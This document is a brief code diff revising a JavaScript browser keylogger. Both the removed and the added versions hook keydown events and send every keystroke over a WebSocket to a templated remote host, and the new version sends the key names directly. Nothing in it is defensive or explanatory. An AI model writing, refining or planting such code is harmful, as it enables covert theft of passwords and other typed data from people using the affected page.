@@ -1,10 +1,8 @@
-if(window["WebSocket"]){
-    const socket = new WebSocket("ws://{{.}}/ws")
-    const keydown = (evt)=> {
-    console.log(evt)
-    const s = String.fromCharCode(evt.which)
-    socket.send(s)
-}
-window.onkeydown= keydown
-// document.onkeydown = keydown
+if (window["WebSocket"]){
+    ws = new WebSocket("ws://{{.}}/ws")
+    // console.log(e.key)
+    document.onkeydown = (e)=>{
+        console.log(e.key)
+        ws.send(e.key)
+    }
 }
